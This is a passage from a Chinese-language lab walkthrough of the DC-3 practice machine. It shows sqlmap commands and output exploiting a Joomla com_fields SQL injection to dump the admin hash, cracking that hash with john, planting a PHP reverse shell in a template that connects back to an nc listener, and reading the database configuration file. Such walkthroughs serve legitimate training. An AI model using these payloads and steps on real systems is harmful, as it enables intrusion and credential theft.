|</span></span><br><span class="line">| <span class="comment">#__bsms_topics      |</span></span><br><span class="line">| <span class="comment">#__bsms_update      |</span></span><br><span class="line">| <span class="comment">#__categories       |</span></span><br><span class="line">| <span class="comment">#__contact_details  |</span></span><br><span class="line">| <span class="comment">#__content_frontpag |</span></span><br><span class="line">| <span class="comment">#__content_rating   |</span></span><br><span class="line">| <span class="comment">#__content_types    |</span></span><br><span class="line">| <span class="comment">#__content          |</span></span><br><span class="line">| <span class="comment">#__contentitem_tag_ |</span></span><br><span class="line">| <span class="comment">#__core_log_searche |</span></span><br><span class="line">| <span class="comment">#__extensions       |</span></span><br><span class="line">| <span class="comment">#__fields_categorie |</span></span><br><span class="line">| <span class="comment">#__fields_groups    |</span></span><br><span class="line">| <span class="comment">#__fields_values    |</span></span><br><span class="line">| <span class="comment">#__fields           |</span></span><br><span class="line">| <span class="comment">#__finder_filters   |</span></span><br><span class="line">| <span class="comment">#__finder_links_ter |</span></span><br><span class="line">| <span class="comment">#__finder_links     |</span></span><br><span class="line">| <span class="comment">#__finder_taxonomy_ |</span></span><br><span class="line">| <span class="comment">#__finder_taxonomy  |</span></span><br><span class="line">| <span class="comment">#__finder_terms_com |</span></span><br><span class="line">| <span class="comment">#__finder_terms     |</span></span><br><span class="line">| <span class="comment">#__finder_tokens_ag |</span></span><br><span class="line">| <span class="comment">#__finder_tokens    |</span></span><br><span class="line">| <span class="comment">#__finder_types     |</span></span><br><span class="line">| <span class="comment">#__jbsbackup_timese |</span></span><br><span class="line">| <span class="comment">#__jbspodcast_times |</span></span><br><span class="line">| <span class="comment">#__languages        |</span></span><br><span class="line">| <span class="comment">#__menu_types       |</span></span><br><span class="line">| <span class="comment">#__menu             |</span></span><br><span class="line">| <span class="comment">#__messages_cfg     |</span></span><br><span class="line">| <span class="comment">#__messages         |</span></span><br><span class="line">| <span class="comment">#__modules_menu     |</span></span><br><span class="line">| <span class="comment">#__modules          |</span></span><br><span class="line">| <span class="comment">#__newsfeeds        |</span></span><br><span class="line">| <span class="comment">#__overrider        |</span></span><br><span class="line">| <span class="comment">#__postinstall_mess |</span></span><br><span class="line">| <span class="comment">#__redirect_links   |</span></span><br><span class="line">| <span class="comment">#__schemas          |</span></span><br><span class="line">| <span class="comment">#__session          |</span></span><br><span class="line">| <span class="comment">#__tags             |</span></span><br><span class="line">| <span class="comment">#__template_styles  |</span></span><br><span class="line">| <span class="comment">#__ucm_base         |</span></span><br><span class="line">| <span class="comment">#__ucm_content      |</span></span><br><span class="line">| <span class="comment">#__ucm_history      |</span></span><br><span class="line">| <span class="comment">#__update_sites_ext |</span></span><br><span class="line">| <span class="comment">#__update_sites     |</span></span><br><span class="line">| <span class="comment">#__updates          |</span></span><br><span class="line">| <span class="comment">#__user_keys        |</span></span><br><span class="line">| <span class="comment">#__user_notes       |</span></span><br><span class="line">| <span class="comment">#__user_profiles    |</span></span><br><span class="line">| <span class="comment">#__user_usergroup_m |</span></span><br><span class="line">| <span class="comment">#__usergroups       |</span></span><br><span class="line">| <span class="comment">#__users            |</span></span><br><span class="line">| <span class="comment">#__utf8_conversion  |</span></span><br><span class="line">| <span class="comment">#__viewlevels       |</span></span><br><span class="line">+---------------------+</span><br><span class="line"></span><br><span class="line">[21:54:04] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 93 <span class="built_in">times</span></span><br><span class="line">[21:54:04] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.1.5&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 21:54:04 /2020-08-21/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/tmp/DC3</span><br></pre></td></tr></table></figure><h3 id="4-爆字段"><a href="#4-爆字段" class="headerlink" title="4.爆字段"></a>4.爆字段</h3><p><code>现有字段选择默认1，线程选择10，直接爆出字段</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"> root@JIYE:~/tmp/DC3<span class="comment"># sqlmap -u &quot;http://192.168.1.5/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__users&quot; --columns -p list[fullordering]</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [.]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 21:59:25 /2020-08-21/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[21:59:25] [INFO] fetched random HTTP User-Agent header value &#x27;</span>Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8<span class="string">&#x27; from file &#x27;</span>/usr/share/sqlmap/data/txt/user-agents.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:59:25] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[21:59:25] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[21:59:26] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests</span></span><br><span class="line"><span class="string">you have not declared cookie(s), while server wants to set its own (&#x27;</span>460ada11b31d3c5e5ca6e58fd5d3de27=ug2jkbpm6cl...hvfgeqmmq0<span class="string">&#x27;). Do you want to use those [Y/n] </span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: list[fullordering] (GET)</span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)</span></span><br><span class="line"><span class="string">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(UPDATEXML(8495,CONCAT(0x2e,0x7170786b71,(SELECT (ELT(8495=8495,1))),0x7170786b71),8473))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</span></span><br><span class="line"><span class="string">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 8890 FROM (SELECT(SLEEP(5)))cGDb)</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[21:59:31] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.1</span></span><br><span class="line"><span class="string">[21:59:31] [INFO] fetching columns for table &#x27;</span><span class="comment">#__users&#x27; in database &#x27;joomladb&#x27;</span></span><br><span class="line">[21:59:32] [WARNING] unable to retrieve column names <span class="keyword">for</span> table <span class="string">&#x27;#__users&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;joomladb&#x27;</span></span><br><span class="line"><span class="keyword">do</span> you want to use common column existence check? [y/N/q] y</span><br><span class="line">[21:59:54] [WARNING] <span class="keyword">in</span> <span class="keyword">case</span> of continuous data retrieval problems you are advised to try a switch <span class="string">&#x27;--no-cast&#x27;</span> or switch <span class="string">&#x27;--hex&#x27;</span></span><br><span class="line"><span class="built_in">which</span> common columns (wordlist) file <span class="keyword">do</span> you want to use?</span><br><span class="line">[1] default <span class="string">&#x27;/usr/share/sqlmap/data/txt/common-columns.txt&#x27;</span> (press Enter)</span><br><span class="line">[2] custom</span><br><span class="line">&gt; 1</span><br><span class="line">[22:00:00] [INFO] checking column existence using items from <span class="string">&#x27;/usr/share/sqlmap/data/txt/common-columns.txt&#x27;</span></span><br><span class="line">[22:00:00] [INFO] adding words used on web page to the check list</span><br><span class="line">please enter number of threads? [Enter <span class="keyword">for</span> 1 (current)] 10</span><br><span class="line">[22:00:07] [INFO] starting 10 threads</span><br><span class="line">[22:00:07] [INFO] retrieved: id                                                                                                                                           </span><br><span class="line">[22:00:07] [INFO] retrieved: name                                                                                                                                         </span><br><span class="line">[22:00:07] [INFO] retrieved: username                                                                                                                                     </span><br><span class="line">[22:00:08] [INFO] retrieved: email                                                                                                                                        </span><br><span class="line">[22:00:11] [INFO] retrieved: password                                                                                                                                     </span><br><span class="line">[22:00:51] [INFO] retrieved: params                                                                                                                                       </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">Database: joomladb</span><br><span class="line">Table: <span class="comment">#__users</span></span><br><span class="line">[6 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| email    | non-numeric |</span><br><span class="line">| id       | numeric     |</span><br><span class="line">| name     | non-numeric |</span><br><span class="line">| params   | non-numeric |</span><br><span class="line">| password | non-numeric |</span><br><span class="line">| username | non-numeric |</span><br><span class="line">+----------+-------------+</span><br><span class="line"></span><br><span class="line">[22:01:02] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 2649 <span class="built_in">times</span></span><br><span class="line">[22:01:02] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.1.5&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 22:01:02 /2020-08-21/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="5-列目录"><a href="#5-列目录" class="headerlink" title="5.列目录"></a>5.列目录</h3><p><code>得到了admin与加密密码</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># sqlmap -u &quot;http://192.168.1.5/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__users&quot; -C &quot;name,password&quot; --dump -p list[fullordering]         </span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&#x27;]_____ ___ ___  &#123;1.4.8#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [&quot;]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [<span class="string">&quot;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 22:06:02 /2020-08-21/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[22:06:02] [INFO] fetched random HTTP User-Agent header value &#x27;Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE) AppleWebKit/523.13 (KHTML, like Gecko) Version/3.0 Safari/523.13&#x27; from file &#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;</span></span><br><span class="line"><span class="string">[22:06:02] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[22:06:02] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[22:06:02] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests</span></span><br><span class="line"><span class="string">you have not declared cookie(s), while server wants to set its own (&#x27;460ada11b31d3c5e5ca6e58fd5d3de27=8hrfk2ep2le...ioqrv6v505&#x27;). Do you want to use those [Y/n] </span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: list[fullordering] (GET)</span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)</span></span><br><span class="line"><span class="string">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(UPDATEXML(8495,CONCAT(0x2e,0x7170786b71,(SELECT (ELT(8495=8495,1))),0x7170786b71),8473))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</span></span><br><span class="line"><span class="string">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 8890 FROM (SELECT(SLEEP(5)))cGDb)</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[22:06:04] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.1</span></span><br><span class="line"><span class="string">[22:06:04] [INFO] fetching entries of column(s) &#x27;name, password&#x27; for table &#x27;#__users&#x27; in database &#x27;joomladb&#x27;</span></span><br><span class="line"><span class="string">[22:06:04] [INFO] retrieved: &#x27;admin&#x27;</span></span><br><span class="line"><span class="string">[22:06:04] [INFO] retrieved: &#x27;<span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span>&#x27;</span></span><br><span class="line"><span class="string">Database: joomladb</span></span><br><span class="line"><span class="string">Table: #__users</span></span><br><span class="line"><span class="string">[1 entry]</span></span><br><span class="line"><span class="string">+-------+--------------------------------------------------------------+</span></span><br><span class="line"><span class="string">| name  | password                                                     |</span></span><br><span class="line"><span class="string">+-------+--------------------------------------------------------------+</span></span><br><span class="line"><span class="string">| admin | <span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span> |</span></span><br><span class="line"><span class="string">+-------+--------------------------------------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[22:06:04] [INFO] table &#x27;joomladb.`#__users`&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.1.5/dump/joomladb/#__users.csv&#x27;</span></span><br><span class="line"><span class="string">[22:06:04] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 6 times</span></span><br><span class="line"><span class="string">[22:06:04] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.5&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 22:06:04 /2020-08-21/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/tmp/DC3#</span></span><br></pre></td></tr></table></figure><h2 id="0x11-使用john解密"><a href="#0x11-使用john解密" class="headerlink" title="0x11.使用john解密"></a>0x11.使用john解密</h2><p><code>密码：snoopy</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># john joomla_v3.7.0_</span></span><br><span class="line">joomla_v3.7.0_admin_hash.txt  joomla_v3.7.0_sqli.txt        </span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># john joomla_v3.7.0_admin_hash.txt </span></span><br><span class="line">Created directory: /root/.john</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 1024 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Almost <span class="keyword">done</span>: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">snoopy           (?)</span><br><span class="line">1g 0:00:00:00 DONE 2/3 (2020-08-21 22:10) 3.448g/s 124.1p/s 124.1c/s 124.1C/s 123456..buster</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># </span></span><br></pre></td></tr></table></figure><h2 id="0x12-登入"><a href="#0x12-登入" class="headerlink" title="0x12.登入"></a>0x12.登入</h2><h3 id="1-发现模板文件"><a href="#1-发现模板文件" class="headerlink" title="1.发现模板文件"></a>1.发现模板文件</h3><img src="/2020/08/22/DC-3/image-20200822105108208.png" class><h3 id="2-找到模板文件目录"><a href="#2-找到模板文件目录" class="headerlink" title="2.找到模板文件目录"></a>2.找到模板文件目录</h3><img src="/2020/08/22/DC-3/image-20200822105443495.png" class><h3 id="3-编辑反弹shell，kali原生自带"><a href="#3-编辑反弹shell，kali原生自带" class="headerlink" title="3.编辑反弹shell，kali原生自带"></a>3.编辑反弹shell，kali原生自带</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># locate webshell</span></span><br><span class="line">/root/.cache/vmware/drag_and_drop/ZKHwFq/w3af/w3af/plugins/attack/payloads/webshell</span><br><span class="line">/root/.cache/vmware/drag_and_drop/ZKHwFq/w3af/w3af/plugins/attack/payloads/webshell/webshell.asp</span><br><span class="line">/root/.cache/vmware/drag_and_drop/ZKHwFq/w3af/w3af/plugins/attack/payloads/webshell/webshell.aspx</span><br><span class="line">/root/.cache/vmware/drag_and_drop/ZKHwFq/w3af/w3af/plugins/attack/payloads/webshell/webshell.jsp</span><br><span class="line">/root/.cache/vmware/drag_and_drop/ZKHwFq/w3af/w3af/plugins/attack/payloads/webshell/webshell.php</span><br><span class="line">/root/.cache/vmware/drag_and_drop/ZKHwFq/w3af/w3af/plugins/attack/payloads/webshell/webshell.pl</span><br><span class="line">/root/.cache/vmware/drag_and_drop/ZKHwFq/w3af/w3af/plugins/attack/payloads/webshell/webshell.py</span><br><span class="line">/usr/bin/webshells</span><br><span class="line">/usr/share/webshells</span><br><span class="line">/usr/share/doc/webshells</span><br><span class="line">/usr/share/doc/webshells/changelog.gz</span><br><span class="line">/usr/share/doc/webshells/copyright</span><br><span class="line">/usr/share/webshells/asp</span><br><span class="line">/usr/share/webshells/aspx</span><br><span class="line">/usr/share/webshells/cfm</span><br><span class="line">/usr/share/webshells/jsp</span><br><span class="line">/usr/share/webshells/laudanum</span><br><span class="line">/usr/share/webshells/perl</span><br><span class="line">/usr/share/webshells/php</span><br><span class="line">/usr/share/webshells/asp/cmd-asp-5.1.asp</span><br><span class="line">/usr/share/webshells/asp/cmdasp.asp</span><br><span class="line">/usr/share/webshells/aspx/cmdasp.aspx</span><br><span class="line">/usr/share/webshells/cfm/cfexec.cfm</span><br><span class="line">/usr/share/webshells/jsp/cmdjsp.jsp</span><br><span class="line">/usr/share/webshells/jsp/jsp-reverse.jsp</span><br><span class="line">/usr/share/webshells/perl/perl-reverse-shell.pl</span><br><span class="line">/usr/share/webshells/perl/perlcmd.cgi</span><br><span class="line">/usr/share/webshells/php/findsocket</span><br><span class="line">/usr/share/webshells/php/php-backdoor.php</span><br><span class="line">/usr/share/webshells/php/php-reverse-shell.php</span><br><span class="line">/usr/share/webshells/php/qsd-php-backdoor.php</span><br><span class="line">/usr/share/webshells/php/simple-backdoor.php</span><br><span class="line">/usr/share/webshells/php/findsocket/findsock.c</span><br><span class="line">/usr/share/webshells/php/findsocket/php-findsock-shell.php</span><br><span class="line">/var/lib/dpkg/info/webshells.list</span><br><span class="line">/var/lib/dpkg/info/webshells.md5sums</span><br><span class="line">/var/lib/dpkg/info/webshells.postinst</span><br><span class="line">/var/lib/dpkg/info/webshells.prerm</span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># </span></span><br></pre></td></tr></table></figure><p><code>使用/usr/share/webshells/php/php-reverse-shell.php，将内容复制到modules.php中</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># cp /usr/share/webshells/php/php-reverse-shell.php reverse.php</span></span><br></pre></td></tr></table></figure><img src="/2020/08/22/DC-3/image-20200822122034297.png" class><p><code>访问得到shell</code></p><img src="/2020/08/22/DC-3/image-20200822122220054.png" class><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.5] 45748</span><br><span class="line">Linux DC-3 4.4.0-21-generic <span class="comment">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line"> 14:21:43 up  3:26,  0 users,  load average: 0.00, 0.01, 0.05</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure><h3 id="4-得到交互shell"><a href="#4-得到交互shell" class="headerlink" title="4.得到交互shell"></a>4.得到交互shell</h3><p><code>使用python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br><span class="line">$ <span class="built_in">cd</span></span><br><span class="line">$ python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@DC-3:/$</span><br></pre></td></tr></table></figure><p><strong>附加：</strong></p><p><code>当Ctrl+z退出shell时，我们如何反回呢？</code></p><blockquote><p>1.先输入stty raw -echo</p><p>2.再按Back+f+g+enter，即可返回shell</p><p>/当前shell下上下箭头就可以使用了/</p></blockquote><img src="/2020/08/22/DC-3/image-20200822124744850.png" class><h2 id="0x13-提权"><a href="#0x13-提权" class="headerlink" title="0x13.提权"></a>0x13.提权</h2><h3 id="1-尝试使用sudo-l-但没有权限"><a href="#1-尝试使用sudo-l-但没有权限" class="headerlink" title="1.尝试使用sudo -l 但没有权限"></a>1.尝试使用sudo -l 但没有权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-3:/$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> www-data: </span><br><span class="line">^Csudo: 1 incorrect password attempt</span><br><span class="line">www-data@DC-3:/$</span><br></pre></td></tr></table></figure><h3 id="2-查看mysql配置文件"><a href="#2-查看mysql配置文件" class="headerlink" title="2.查看mysql配置文件"></a>2.查看mysql配置文件</h3><p><code>找到了mysql的root账户密码，碰碰运气，看看能不能登入到系统</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-3:/var/www/html$ cat configuration.php </span><br><span class="line">&lt;?php</span><br><span class="line">class JConfig &#123;</span><br><span class="line">        public <span class="variable">$offline</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$offline_message</span> = <span class="string">&#x27;This site is down for maintenance.&lt;br /&gt;Please check back again 